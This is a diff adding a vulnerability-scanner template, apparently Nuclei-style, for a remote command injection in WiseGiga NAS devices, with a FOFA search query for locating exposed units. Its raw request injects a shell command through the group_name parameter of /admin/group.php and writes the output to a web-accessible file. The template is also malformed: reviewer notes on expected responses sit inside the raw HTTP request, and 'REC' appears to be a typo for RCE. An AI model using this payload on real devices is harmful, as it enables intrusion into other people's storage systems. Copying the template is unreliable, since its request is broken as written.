@@ -1,0 +1,34 @@
+id: poc-mmryw7d46qt7fzql
+info:
+  name: WiseGiga NAS网络存储器 REC
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mmryw7d46qt7fzql'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: mmryw7d46qt7fzql
+    fofa: fofa：title="WiseGiga"
+http:
+- raw:
+  - 'GET /admin/group.php?memberid=root&cmd=add&group_name=d;id>dudesuite.txt HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    windows.open
+
+
+    # 上传文件定位
+
+    /admin/dudesuite.txt'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
